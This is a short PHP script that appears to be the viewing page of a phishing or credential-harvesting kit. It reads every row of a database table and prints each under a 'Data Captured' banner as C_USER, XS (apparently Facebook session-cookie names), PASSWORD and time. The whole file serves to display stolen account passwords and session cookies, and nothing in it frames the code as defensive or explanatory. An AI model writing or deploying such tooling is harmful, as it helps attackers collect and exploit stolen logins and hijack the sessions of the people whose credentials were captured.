<?php

require __DIR__ . '/database.php';

  $sql =<<<EOF
      SELECT * from DATA;
EOF;

  $ret = pg_query($dbconn, $sql);
  if(!$ret) {
    echo pg_last_error($dbconn);
    exit;
  } 
  while($row = pg_fetch_row($ret)) {
    echo "*********Data Captured**********";
    echo "C_USER = ". $row[0] . "\n";
    echo "XS = ". $row[1] ."\n";
    echo "PASSWORD = ". $row[2] ."\n";
    echo "TIME =  ".$row[4] ."\n";
    echo "------------------------------";
    echo "\n\n";
  }
  pg_close($db);